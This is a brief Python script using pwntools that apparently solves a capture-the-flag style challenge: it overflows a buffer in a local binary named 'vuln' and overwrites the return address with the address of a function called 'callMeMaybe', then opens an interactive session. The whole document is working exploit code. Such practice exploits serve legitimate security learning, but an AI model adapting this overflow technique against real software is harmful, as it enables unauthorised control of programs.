from pwn import *

p = process("./vuln")
elf = ELF("./vuln")

p.sendlineafter("Hello\n>>> " , "a" * 0x20 + "b" * 0x8 + p64(elf.sym["callMeMaybe"]))
p.interactive()